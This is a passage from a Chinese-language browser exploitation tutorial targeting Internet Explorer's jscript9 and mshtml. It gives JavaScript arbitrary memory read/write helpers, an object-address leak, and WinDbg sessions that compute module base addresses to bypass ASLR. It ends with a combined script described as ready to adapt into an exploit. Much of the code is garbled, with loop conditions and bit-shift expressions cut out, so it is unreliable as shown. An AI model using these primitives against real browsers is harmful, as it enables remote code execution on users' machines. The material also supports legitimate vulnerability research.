    	}
    }
    function write(address,value) {
    	var k = address & 3;
    	if (k == 0) {
    		int32array[address/4] = value;
    	} else {
    		alert("to debug");
    		var low = int32array[(address-k)/4];
    		var high = int32array[(address-k+4)/4];
    		var mask = (1> (32 - k*8));
    		int32array[(address-k)/4] = low;
    		int32array[(address-k+4)/4] = high;
    	}
    }
##
## 泄露对象地址
为了确定模块的基地址，还需要能够得到任意对象的地址，这里利用到了Array数组，把一个对象赋给数组的最后一个元素，然后通过读地址读出对象的地址。具体实现如下:
    for (var i = 0x200; i  lmm jscript9
    start    end        module name
    630d0000 63392000   jscript9   (pdb symbols)          c:\symbols\jscript9.pdb\6E55E6B5AC4B4699BFCF4B58510435202\jscript9.pdb
    0:017> ln 630d38c8
    (630d38c8)   jscript9!Js::TypedArray::`vftable'   |  (630d3a20)   jscript9!Js::TypedArray::`vftable'
    Exact matches:
        jscript9!Js::TypedArray::`vftable' = 
    0:017> ? 630d38c8-630d0000
    Evaluate expression: 14536 = 000038c8
先通过数组，先看看div对象:
    leakArray[0x3bf7] = document.createElement("div");
得到的div对象:
    0529a0c0 630d2ad0 jscript9!Js::CustomExternalObject::`vftable'
    0529a0c4 0ce5adc0 
    0529a0c8 00000000 
    0529a0cc 00000003 
    0529a0d0 6372d05d MSHTML!CBaseTypeOperations::CBaseFinalizer
    0529a0d4 00000000 
    0529a0d8 02531ff0 
    0529a0dc 00000000 
    ...
偏移0x10处是CBaseTypeOperations::CBaseFinalizer对象，可以用这个来计算mshtml的基地址:
    0:002> ln 6372d05d
    (6372d05d)   MSHTML!CBaseTypeOperations::CBaseFinalizer   |  (6372d11a)   MSHTML!CElement::JSBind_Unroot
    Exact matches:
        MSHTML!CBaseTypeOperations::CBaseFinalizer = 
    0:002> lmm mshtml
    start    end        module name
    636f0000 644ad000   MSHTML     (pdb symbols)          c:\symbols\mshtml.pdb\98191859560C471FB6BA0B1D33DAACCB2\mshtml.pdb
    0:002> ? 6372d05d-636f0000 
    Evaluate expression: 249949 = 0003d05d
综合如下:
    var jscript9 = read(0x0c0af000) - 0x38c8;
    var addr = get_addr(document.createElement("div")); 
    var mshtml = read(addr + 0x10) - 0x3d05d;
得到结果:
    mshtml at: 636f0000
    jscript9 at: 630d0000 
与实际结果一致:
    0:005> lmm mshtml
    start    end        module name
    636f0000 644ad000   MSHTML     (deferred)             
    0:005> lmm jscript9
    start    end        module name
    630d0000 63392000   jscript9   (pdb symbols)          c:\symbols\jscript9.pdb\6E55E6B5AC4B4699BFCF4B58510435202\jscript9.pdb
## 总结
脚本总结如下:
    	(function() {
    		CollectGarbage();
    		alert("Start");
    		var a = new Array(); 
    		for (var i = 0; i >k*8 | (int32array[(address-k+4)/4] > (32 - k*8));
    				int32array[(address-k)/4] = low;
    				int32array[(address-k+4)/4] = high;
    			}
    		}
    		for (var i = 0x200; i ");
    		document.write("jscript9 at: "+jscript9.toString(16));
    	})();
这是通用的方法，稍加修改就可以放在exp中实现任意地址的读写。